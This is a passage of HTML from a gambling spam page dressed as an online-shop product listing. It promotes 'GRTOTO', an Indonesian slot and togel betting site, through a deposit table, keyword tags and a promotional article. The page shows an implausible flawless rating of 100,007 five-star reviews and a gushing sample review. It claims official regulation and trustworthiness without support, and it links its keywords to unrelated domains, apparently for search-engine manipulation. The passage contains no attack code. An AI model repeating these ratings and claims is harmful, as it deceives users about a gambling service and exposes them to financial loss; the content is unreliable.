                                    <p><a href="https://www.arsvivendi-catering.de/impressum" >bandar slot terpercaya</a></p>
                                </div>

                                <div class="flex flex-wrap items-center gap-4" bis_skin_checked="1"><span
                                        class="text-sm">Terjual
                                        100.007</span>
                                    
                                    <div class="h-5 w-[0.5px] bg-[#818181]" bis_skin_checked="1"></div>
                                    <div class="flex items-center gap-2" bis_skin_checked="1"><span class="nuxt-icon">
                                            <svg width="17" height="16" viewBox="0 0 17 16" fill="none"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <path
                                                    d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                    fill="#FFD028" stroke="#E6B300" stroke-width="0.5"
                                                    stroke-linecap="round" stroke-linejoin="round"></path>
                                            </svg>
                                            <svg width="17" height="16" viewBox="0 0 17 16" fill="none"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <path
                                                    d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                    fill="#FFD028" stroke="#E6B300" stroke-width="0.5"
                                                    stroke-linecap="round" stroke-linejoin="round"></path>
                                            </svg>
                                            <svg width="17" height="16" viewBox="0 0 17 16" fill="none"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <path
                                                    d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                    fill="#FFD028" stroke="#E6B300" stroke-width="0.5"
                                                    stroke-linecap="round" stroke-linejoin="round"></path>
                                            </svg>
                                            <svg width="17" height="16" viewBox="0 0 17 16" fill="none"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <path
                                                    d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                    fill="#FFD028" stroke="#E6B300" stroke-width="0.5"
                                                    stroke-linecap="round" stroke-linejoin="round"></path>
                                            </svg>
                                            <svg width="17" height="16" viewBox="0 0 17 16" fill="none"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <path
                                                    d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                    fill="#FFD028" stroke="#E6B300" stroke-width="0.5"
                                                    stroke-linecap="round" stroke-linejoin="round"></path>
                                            </svg>
                                        </span><span class="text-sm">8888 (100.007 penilaian)</span></div><a
                                        href="https://c-e-o.b-cdn.net/c-e-o.html"
                                        class="flex items-center gap-2"><span class="nuxt-icon pt-1 text-xl"><svg
                                                width="18" height="22" viewBox="0 0 18 22" fill="none"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <path
                                                    d="M10 3H3C2.46957 3 1.96086 3.21071 1.58579 3.58579C1.21071 3.96086 1 4.46957 1 5V17C1 17.5304 1.21071 18.0391 1.58579 18.4142C1.96086 18.7893 2.46957 19 3 19H10M14 3H15C15.5304 3 16.0391 3.21071 16.4142 3.58579C16.7893 3.96086 17 4.46957 17 5V6M17 16V17C17 17.5304 16.7893 18.0391 16.4142 18.4142C16.0391 18.7893 15.5304 19 15 19H14M17 10V12M9 1V21"
                                                    stroke="#005AAB" stroke-width="1.5" stroke-linecap="round"
                                                    stroke-linejoin="round"></path>
                                            </svg>
                                        </span><span class="font-bold text-primary">Bandingkan</span></a>
                                </div>
                                <div class="flex flex-wrap items-center gap-3" bis_skin_checked="1">
                                    <!----><span class="text-2xl font-bold text-primary">5.000</span>
                                </div>
                                <!---->
                                <!---->
                                <hr class="border-bw-200"><span
                                    class="mr-auto rounded-full bg-primary-200 px-2 py-1 text-xs text-bw-700">GRTOTO</span><span
                                    class="mr-auto rounded-full bg-primary-200 px-2 py-1 text-xs text-bw-700">SITUS TOTO</span><span
                                    class="mr-auto rounded-full bg-primary-200 px-2 py-1 text-xs text-bw-700">TOTO 4D</span><span
                                    class="mr-auto rounded-full bg-primary-200 px-2 py-1 text-xs text-bw-700">BANDAR SLOT</span><span
                                    class="mr-auto rounded-full bg-primary-200 px-2 py-1 text-xs text-bw-700">TOGEL</span><span
                                    class="mr-auto rounded-full bg-primary-200 px-2 py-1 text-xs text-bw-700">TOTO ONLINE</span>
                                <hr class="border-bw-200">
                                <div class="flex items-center justify-between" bis_skin_checked="1">
                                    <div class="flex flex-col items-start gap-2" bis_skin_checked="1"><span
                                            class="font-semibold">Pengiriman Kurir</span><span
                                            class="text-sm text-bw-500">Masuk terlebih
                                            dahulu supaya kamu bisa melihat metode yang tersedia dan estimasi
                                            biayanya</span><a
                                            href="https://c-e-o.b-cdn.net/c-e-o.html"
                                            class="font-bold text-primary">Masuk</a>
                                    </div>
                                </div>
                                <style>
                                    /* GRID WRAPPER */
                                    .GRTOTO-info-grid {
                                        display: grid;
                                        grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
                                        gap: 18px;
                                        margin: 30px auto;
                                        max-width: 780px;
                                    }

                                    /* CARD */
                                    .info-card {
                                        background: linear-gradient(145deg, rgba(20, 30, 45, 0.85), rgba(5, 10, 20, 0.85));
                                        padding: 22px;
                                        border-radius: 16px;
                                        border: 1px solid rgba(255, 238, 0, 0.25);
                                        box-shadow: 0 0 18px rgba(255, 0, 0, 0.15);
                                        backdrop-filter: blur(6px);
                                        transition: 0.3s ease;
                                        position: relative;
                                        overflow: hidden;
                                    }

                                    /* HOVER ANIMASI */
                                    .info-card:hover {
                                        transform: translateY(-6px);
                                        box-shadow: 0 0 25px rgba(251, 255, 0, 0.45);
                                        border-color: #e5013e;
                                    }

                                    /* TITLE */
                                    .info-card-title {
                                        font-size: 15px;
                                        font-weight: 600;
                                        color: #e5013e;
                                        margin-bottom: 8px;
                                        letter-spacing: 0.5px;
                                    }

                                    /* VALUE */
                                    .info-card-value {
                                        font-size: 18px;
                                        font-weight: 700;
                                        color: #ffffff;
                                    }

                                    /* NEON CORNER EFFECT */
                                    .info-card::before {
                                        content: "";
                                        position: absolute;
                                        top: -2px;
                                        left: -2px;
                                        width: 0;
                                        height: 0;
                                        border-top: 30px solid #e5013e;
                                        border-right: 30px solid transparent;
                                        opacity: 0.45;
                                    }

                                    .info-card::after {
                                        content: "";
                                        position: absolute;
                                        bottom: -2px;
                                        right: -2px;
                                        width: 0;
                                        height: 0;
                                        border-bottom: 30px solid #e5013e;
                                        border-left: 30px solid transparent;
                                        opacity: 0.45;
                                    }
                                </style>
                                <style>
                                    .title-box-neon {
                                        max-width: 750px;
                                        margin: 25px auto;
                                        padding: 14px 25px;
                                        text-align: center;
                                        background: linear-gradient(to bottom, #333333 0%, #111111 100%);
                                        border: 3px solid rgba(255, 0, 0, 0.2);
                                        border-radius: 14px;
                                        box-shadow:
                                            0 0 12px rgba(0, 0, 0, 0.5),
                                            0 0 25px rgba(255, 0, 0, 0.2) inset;
                                        backdrop-filter: blur(8px);
                                        animation: neonPulse 2.8s infinite linear;
                                    }
                                </style>

                                <div class="flex items-center justify-between" bis_skin_checked="1">
                                    <table
                                        style="border-collapse: collapse; width: 100%; font-family: Arial, sans-serif; text-align: left; background: black;"
                                        border="1" cellspacing="0" cellpadding="10">
                                        <tbody>
                                            <tr
                                                style="color: #fff; font-weight: bold; text-align: center; border:  2px solid #e5013e;">
                                                <th style="width: 50%; border:  2px solid #e5013e;">KETERANGAN
                                                </th>
                                                <th>DETAIL</th>
                                            </tr>
                                            <tr style="border:  2px solid #e5013e; text-align: center;">
                                                <td style="border:  2px solid #e5013e;"><span
                                                        style="color: #ffffff;">NAMA
                                                        SITUS</span></td>
                                                <td><span style="color: #ffffff;">GRTOTO</span></td>
                                            </tr>
                                            <tr style="border:  2px solid #e5013e; text-align: center;">
                                                <td style="border:  2px solid #e5013e;"><span
                                                        style="color: #ffffff;">SERVER</span></td>
                                                <td><span style="color: #ffffff;">INDONESIA</span></td>
                                            </tr>
                                            <tr style="border:  2px solid #e5013e; text-align: center;">
                                                <td style="border:  2px solid #e5013e;"><span
                                                        style="color: #ffffff;">MIN
                                                        DEPO</span></td>
                                                <td><span style="color: #ffffff;">Rp 5.000</span></td>
                                            </tr>
                                            <tr style="border:  2px solid #e5013e; text-align: center;">
                                                <td style="border:  2px solid #e5013e;"><span
                                                        style="color: #ffffff;">MIN
                                                        TARIK DANA</span></td>
                                                <td><span style="color: #ffffff;">Rp 25.000</span></td>
                                            </tr>
                                            <tr style="border:  2px solid #e5013e; text-align: center;">
                                                <td style="border:  2px solid #e5013e;"><span
                                                        style="color: #ffffff;">PERMAINAN</span></td>
                                                <td><span style="color: #ffffff;">TOTO TOGEL</span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </section>
                        </div>

                        <div class="container grid gap-6 pt-4" bis_skin_checked="1">
                            <section>
                                <div data-v-f6f73e9b="" class="tabs-container flex border-b-2 border-primary-200"
                                    bis_skin_checked="1">
                                    <div data-v-f6f73e9b=""
                                        class="flex cursor-pointer items-center justify-center gap-2 px-6 py-[10px] text-center font-medium border-primary  text-primary border-b-2"
                                        bis_skin_checked="1">
                                        <!----><span data-v-f6f73e9b="">Deskripsi</span>
                                        <!---->
                                    </div>
                                    <div data-v-f6f73e9b=""
                                        class="flex cursor-pointer items-center justify-center gap-2 px-6 py-[10px] text-center font-medium text-bw-700"
                                        bis_skin_checked="1">
                                        <!----><span data-v-f6f73e9b="">Spesifikasi</span>
                                        <!---->
                                    </div>
                                </div>
                                <div class="relative transition-all duration-1000 ease-in-out" bis_skin_checked="1">
                                    <style>
                                        article {
                                            max-width: 1166px;
                                            margin: 40px auto;
                                            background: #0f0f0f;
                                            color: #fff;
                                            font-family: "Poppins", Arial, sans-serif;
                                            padding: 35px;
                                            border-radius: 16px;
                                            box-shadow: 0 0 25px rgba(0, 255, 128, 0.15);
                                            line-height: 1.8;
                                        }

                                        article h1 {
                                            color: #e5013e;
                                            font-size: 2rem;
                                            text-align: center;
                                            margin-bottom: 15px;
                                            text-transform: uppercase;
                                        }

                                        article p[itemprop="description"] {
                                            text-align: center;
                                            font-size: 1.05rem;
                                            color: #d9d9d9;
                                            margin-bottom: 30px;
                                        }

                                        article h2 {
                                            color: #e5013e;
                                            margin-top: 25px;
                                            font-size: 1.4rem;
                                            border-left: 5px solid #e5013e;
                                            padding-left: 10px;
                                        }

                                        article p {
                                            color: #e0e0e0;
                                            margin: 10px 0;
                                        }

                                        article ul,
                                        article ol {
                                            margin-left: 25px;
                                            margin-bottom: 15px;
                                        }

                                        article ul li,
                                        article ol li {
                                            margin: 8px 0;
                                            color: #f3f3f3;
                                        }

                                        article strong {
                                            color: #f01111;
                                        }

                                        article em {
                                            color: #87abff;
                                            font-style: normal;
                                        }

                                        /* Hover effect */
                                        article a {
                                            text-decoration: none;
                                            border-bottom: 1px dashed #e5013e;
                                            transition: color 0.3s;
                                        }

                                        article a:hover {
                                            color: #fff;
                                        }

                                        /* Highlight box */
                                        section#bonus,
                                        section#keunggulan {
                                            background: rgba(255, 255, 255, 0.05);
                                            padding: 20px;
                                            border-radius: 10px;
                                            margin-top: 25px;
                                            border-left: 4px solid #e5013e;
                                        }

                                        /* Responsive */
                                        @media (max-width: 768px) {
                                            article {
                                                padding: 20px;
                                            }

                                            article h1 {
                                                font-size: 1.6rem;
                                            }
                                        }
                                    </style>
                                    <article class="grid gap-2 py-2">
                                        <header>
                                            <h1 itemprop="headline" style="color:#ffffff;text-align:center;">
                                                <strong>GRTOTO: Pusat Bandar Slot Togel Terpercaya Tempat Jackpot Spektakuler Tanpa Henti</strong>
                                            </h1>
                                            <p itemprop="description" style="color:#ffffff;text-align:justify;">
    <a href="https://otiumpro.com/clientes/" alt="GRTOTO">GRTOTO</a> adalah pusat platform yang selalu memprioritaskan kenyamanan maupun regulasi resmi, hingga hari ini dikelas luas sebagai tempat dengan kelas elite dari berbagai kalangan di Indonesia. Setiap pemain slot online togel di saat ini pasti akan selalu mencari sistem terbaik yang mampu menawarkan jackpot tanpa henti, GRTOTO selalu memberi rasa aman dalam setiap peraminan. Regulasi resmi menjadi dasar utama, tidak seperti platform-platform lain.
</p>

<p itemprop="description" style="color:#ddd;text-align:justify;">
    Sebagai <a href="https://otiumpro.com/clientes/" alt="Toto Online">bandar slot terpercaya</a>, <strong>GRTOTO pusat bandar slot togel terpercaya tempat jackpot spektakuler tanpa henti</strong> hadirkan banyak sekali pasaran slot resmi & togel toto 4d populer masa kini yang menawarkan sistem transparan. Semua hasil sampai data result akan ditampilkan dengan cara langsung, jelas. Menjadikan pemain bisa bermain lebih puas percaya diri, update keluaran cepat, akurat, dan nilai tambah bagi GRTOTO yang terus dipercaya oleh komunitas-komunitas online.
</p>
                                </header>
                                    </article>
                                    <!---->
                                    <!---->
                                </div>
                                <!---->
                            </section>
                            <section class="grid gap-10">
                                <h2 class="h7 text-bw-900">GRTOTO: Pusat Bandar Slot Togel Terpercaya Tempat Jackpot Spektakuler Tanpa Henti</h2>
                                <div class="grid gap-10 md:grid-cols-4" bis_skin_checked="1">
                                    <div class="flex flex-col items-center gap-3" bis_skin_checked="1">
                                        <div class="flex items-end gap-3 font-bold" bis_skin_checked="1"><span
                                                class="text-[40px] leading-tight">5.0</span><span class="text-lg">/
                                                5.0</span></div><span class="text-lg text-bw-800"><b>100.007</b>
                                            Penilaian</span>
                                        <div class="grid gap-2 self-stretch" bis_skin_checked="1">
                                            <div class="flex items-center gap-2" bis_skin_checked="1"><span
                                                    class="nuxt-icon text-sm"><svg width="17" height="16"
                                                        viewBox="0 0 17 16" fill="none"
                                                        xmlns="http://www.w3.org/2000/svg">
                                                        <path
                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                            fill="#FFD028" stroke="#E6B300" stroke-width="0.5"
                                                            stroke-linecap="round" stroke-linejoin="round"></path>
                                                    </svg>
                                                </span><span class="text-sm">5</span>
                                                <div class="relative flex h-2 w-full overflow-hidden rounded-full bg-[#D9D9D9]"
                                                    bis_skin_checked="1">
                                                    <div class="absolute left-0 top-0 z-[1] h-full bg-primary"
                                                        bis_skin_checked="1" style="width: 100%;"></div>
                                                </div><span class="w-6 text-sm">100.007</span>
                                            </div>
                                            <div class="flex items-center gap-2" bis_skin_checked="1"><span
                                                    class="nuxt-icon text-sm"><svg width="17" height="16"
                                                        viewBox="0 0 17 16" fill="none"
                                                        xmlns="http://www.w3.org/2000/svg">
                                                        <path
                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                            fill="#FFD028" stroke="#E6B300" stroke-width="0.5"
                                                            stroke-linecap="round" stroke-linejoin="round"></path>
                                                    </svg>
                                                </span><span class="text-sm">4</span>
                                                <div class="relative flex h-2 w-full overflow-hidden rounded-full bg-[#D9D9D9]"
                                                    bis_skin_checked="1">
                                                    <div class="absolute left-0 top-0 z-[1] h-full bg-primary"
                                                        bis_skin_checked="1" style="width: 0%;"></div>
                                                </div><span class="w-6 text-sm">0</span>
                                            </div>
                                            <div class="flex items-center gap-2" bis_skin_checked="1"><span
                                                    class="nuxt-icon text-sm"><svg width="17" height="16"
                                                        viewBox="0 0 17 16" fill="none"
                                                        xmlns="http://www.w3.org/2000/svg">
                                                        <path
                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                            fill="#FFD028" stroke="#E6B300" stroke-width="0.5"
                                                            stroke-linecap="round" stroke-linejoin="round"></path>
                                                    </svg>
                                                </span><span class="text-sm">3</span>
                                                <div class="relative flex h-2 w-full overflow-hidden rounded-full bg-[#D9D9D9]"
                                                    bis_skin_checked="1">
                                                    <div class="absolute left-0 top-0 z-[1] h-full bg-primary"
                                                        bis_skin_checked="1" style="width: 0%;"></div>
                                                </div><span class="w-6 text-sm">0</span>
                                            </div>
                                            <div class="flex items-center gap-2" bis_skin_checked="1"><span
                                                    class="nuxt-icon text-sm"><svg width="17" height="16"
                                                        viewBox="0 0 17 16" fill="none"
                                                        xmlns="http://www.w3.org/2000/svg">
                                                        <path
                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                            fill="#FFD028" stroke="#E6B300" stroke-width="0.5"
                                                            stroke-linecap="round" stroke-linejoin="round"></path>
                                                    </svg>
                                                </span><span class="text-sm">2</span>
                                                <div class="relative flex h-2 w-full overflow-hidden rounded-full bg-[#D9D9D9]"
                                                    bis_skin_checked="1">
                                                    <div class="absolute left-0 top-0 z-[1] h-full bg-primary"
                                                        bis_skin_checked="1" style="width: 0%;"></div>
                                                </div><span class="w-6 text-sm">0</span>
                                            </div>
                                            <div class="flex items-center gap-2" bis_skin_checked="1"><span
                                                    class="nuxt-icon text-sm"><svg width="17" height="16"
                                                        viewBox="0 0 17 16" fill="none"
                                                        xmlns="http://www.w3.org/2000/svg">
                                                        <path
                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                            fill="#FFD028" stroke="#E6B300" stroke-width="0.5"
                                                            stroke-linecap="round" stroke-linejoin="round"></path>
                                                    </svg>
                                                </span><span class="text-sm">1</span>
                                                <div class="relative flex h-2 w-full overflow-hidden rounded-full bg-[#D9D9D9]"
                                                    bis_skin_checked="1">
                                                    <div class="absolute left-0 top-0 z-[1] h-full bg-primary"
                                                        bis_skin_checked="1" style="width: 0%;"></div>
                                                </div><span class="w-6 text-sm">0</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="my-auto max-md:border-t max-md:pt-4 md:col-span-3 md:border-l md:pl-10"
                                        bis_skin_checked="1">
                                        <div class="grid gap-4" bis_skin_checked="1"><span
                                                class="text-lg font-bold">Foto dan Video
                                                Produk</span>
                                            <div class="grid grid-cols-4 gap-4 md:grid-cols-7" bis_skin_checked="1">
                                                <div class="relative aspect-square cursor-pointer overflow-hidden rounded-xl border"
                                                    bis_skin_checked="1"><img
                                                        src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                        alt="" class="h-full w-full object-cover object-center"
                                                        loading="lazy">
                                                    <!---->
                                                </div>
                                                <div class="relative aspect-square cursor-pointer overflow-hidden rounded-xl border"
                                                    bis_skin_checked="1"><img
                                                        src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                        alt="" class="h-full w-full object-cover object-center"
                                                        loading="lazy">
                                                    <!---->
                                                </div>
                                                <div class="relative aspect-square cursor-pointer overflow-hidden rounded-xl border"
                                                    bis_skin_checked="1"><img
                                                        src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                        alt="" class="h-full w-full object-cover object-center"
                                                        loading="lazy">
                                                    <!---->
                                                </div>
                                            </div>
                                            <span class="text-sm font-semibold text-primary">Belum ada ulasan</span>
                                        </div>
                                        <!---->
                                        <!---->
                                    </div>
                                </div>
                                <hr class="border-bw-200">
                                <h2 class="h7 text-bw-900">Tampilkan Penilaian &amp; Ulasan</h2>
                                <div class="flex justify-between gap-6 max-md:flex-col md:items-start"
                                    bis_skin_checked="1">
                                    <div class="flex flex-wrap gap-3" bis_skin_checked="1"><button
                                            class="min-w-20 rounded-full border p-3 text-sm font-medium border-primary bg-primary text-white">Semua
                                            (100.007)</button><button
                                            class="min-w-20 rounded-full border p-3 text-sm font-medium border-bw-400 text-bw-900">Foto
                                            &amp;
                                            Video </button><button
                                            class="min-w-20 rounded-full border p-3 text-sm font-medium border-bw-400 text-bw-900">5.0
                                        </button><button
                                            class="min-w-20 rounded-full border p-3 text-sm font-medium border-bw-400 text-bw-900">4.0
                                        </button><button
                                            class="min-w-20 rounded-full border p-3 text-sm font-medium border-bw-400 text-bw-900">3.0
                                        </button><button
                                            class="min-w-20 rounded-full border p-3 text-sm font-medium border-bw-400 text-bw-900">2.0
                                        </button><button
                                            class="min-w-20 rounded-full border p-3 text-sm font-medium border-bw-400 text-bw-900">1.0
                                        </button></div>
                                    <div class="flex gap-3 max-md:flex-col" bis_skin_checked="1">
                                        <div dir="auto"
                                            class="v-select vs--single vs--unsearchable form-select min-w-60"
                                            bis_skin_checked="1">
                                            <div id="vs7__combobox" class="vs__dropdown-toggle" role="combobox"
                                                aria-expanded="false" aria-owns="vs7__listbox"
                                                aria-label="Search for option" bis_skin_checked="1">
                                                <div class="vs__selected-options" bis_skin_checked="1"><span
                                                        class="vs__selected">Paling
                                                        Membantu<!----></span><input class="vs__search" readonly=""
                                                        aria-autocomplete="list" aria-labelledby="vs7__combobox"
                                                        aria-controls="vs7__listbox" type="search" autocomplete="off"
                                                        value=""></div>
                                                <div class="vs__actions" bis_skin_checked="1"><button type="button"
                                                        class="vs__clear" title="Clear Selected"
                                                        aria-label="Clear Selected" style="display: none;"><svg
                                                            xmlns="http://www.w3.org/2000/svg" width="10" height="10">
                                                            <path
                                                                d="M6.895455 5l2.842897-2.842898c.348864-.348863.348864-.914488 0-1.263636L9.106534.261648c-.348864-.348864-.914489-.348864-1.263636 0L5 3.104545 2.157102.261648c-.348863-.348864-.914488-.348864-1.263636 0L.261648.893466c-.348864.348864-.348864.914489 0 1.263636L3.104545 5 .261648 7.842898c-.348864.348863-.348864.914488 0 1.263636l.631818.631818c.348864.348864.914773.348864 1.263636 0L5 6.895455l2.842898 2.842897c.348863.348864.914772.348864 1.263636 0l.631818-.631818c.348864-.348864.348864-.914489 0-1.263636L6.895455 5z">
                                                            </path>
                                                        </svg></button><svg xmlns="http://www.w3.org/2000/svg"
                                                        width="14" height="10" role="presentation"
                                                        class="vs__open-indicator">
                                                        <path
                                                            d="M9.211364 7.59931l4.48338-4.867229c.407008-.441854.407008-1.158247 0-1.60046l-.73712-.80023c-.407008-.441854-1.066904-.441854-1.474243 0L7 5.198617 2.51662.33139c-.407008-.441853-1.066904-.441853-1.474243 0l-.737121.80023c-.407008.441854-.407008 1.158248 0 1.600461l4.48338 4.867228L7 10l2.211364-2.40069z">
                                                        </path>
                                                    </svg>
                                                    <div class="vs__spinner" bis_skin_checked="1"
                                                        style="display: none;">Loading...</div>
                                                </div>
                                            </div>
                                            <ul id="vs7__listbox" role="listbox"
                                                style="display: none; visibility: hidden;"></ul>
                                        </div>
                                    </div>
                                </div>
                                <div class="grid gap-6" bis_skin_checked="1">
                                    <div class="flex justify-between gap-6 max-md:flex-col md:items-center"
                                        bis_skin_checked="1">
                                        <div class="grid gap-3" bis_skin_checked="1">
                                            <div class="grid gap-3" bis_skin_checked="1">
                                                <div class="flex justify-between" bis_skin_checked="1">
                                                    <div class="flex items-center gap-2" bis_skin_checked="1">
                                                        <div class="flex items-center gap-2" bis_skin_checked="1">
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                        </div>
                                                        <hr class="h-5 w-[0.5px] bg-bw-900">
                                                        <span class="text-sm text-bw-900">10 Januari 2026</span>
                                                    </div>
                                                </div>
                                                <div class="flex items-center gap-2" bis_skin_checked="1">
                                                    <div class="aspect-square size-8 cursor-pointer overflow-hidden rounded-full border"
                                                        bis_skin_checked="1">
                                                        <img src="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png"
                                                            alt="" width="32" height="32" class="rounded-full"
                                                            loading="lazy">
                                                    </div>
                                                    <span class="text-sm">ba************di</span>
                                                </div>
                                                <span class="text-sm text-bw-900">Game: Situs Slot</span>
                                                <div class="flex flex-wrap items-center gap-2" bis_skin_checked="1">
                                                    <span class="text-sm text-bw-900">Jakarta</span>
                                                </div>
                                                <p>GRTOTO benar-benar tempat main slot gacor paling aman. Link selalu aktif dan cepat, bikin saya nyaman bermain setiap hari.</p>
                                            </div>
                                            <div class="flex gap-4" bis_skin_checked="1">
                                                <img src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt="" width="80" height="80"
                                                    class="cursor-pointer rounded-xl object-cover object-center"
                                                    loading="lazy">
                                                <img src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt="" width="80" height="80"
                                                    class="cursor-pointer rounded-xl object-cover object-center"
                                                    loading="lazy">
                                            </div>
                                        </div>
                                        <button class="flex items-center gap-1">
                                            <span class="nuxt-icon" style="display: none;"></span>
                                            <span class="nuxt-icon">
                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
                                                    xmlns="http://www.w3.org/2000/svg">
                                                    <path
